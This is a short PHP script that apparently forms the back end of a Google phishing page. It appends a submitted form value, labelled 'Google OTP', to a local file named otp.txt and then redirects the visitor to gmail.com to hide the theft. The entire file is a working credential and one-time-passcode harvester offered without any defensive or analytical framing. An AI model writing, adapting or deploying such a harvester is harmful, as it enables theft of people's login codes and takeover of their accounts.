<?php
file_put_contents("otp.txt", "Google OTP : " . $email = $_POST['email'] . "\n", FILE_APPEND);
header('Location: https://www.gmail.com/');
?>
